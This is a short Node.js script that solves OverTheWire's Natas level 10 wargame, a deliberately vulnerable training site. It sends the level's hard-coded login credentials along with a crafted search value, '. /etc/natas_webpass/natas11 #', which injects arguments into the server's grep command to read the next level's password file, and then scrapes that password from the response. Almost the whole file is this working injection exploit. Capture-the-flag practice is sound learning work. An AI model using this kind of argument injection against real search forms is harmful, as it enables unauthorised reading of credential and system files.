#!/usr/bin/env node
const axios = require("axios");
const cheerio = require("cheerio");

const username = "natas10";
const password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu";

const url = `http://${username}.natas.labs.overthewire.org/`;

const data = {
  needle: ". /etc/natas_webpass/natas11 #",
  submit: "Search",
};

const urlEncodedData = Object.keys(data)
  .map((key) => `${key}=${data[key]}`)
  .join("&");

(async function () {
  const response = await axios.post(url, urlEncodedData, {
    auth: {
      username,
      password,
    },
  });

  const $ = cheerio.load(response.data);
  const re = />(.\w+)\n/;

  console.log($.html().match(re)[1]);
})();
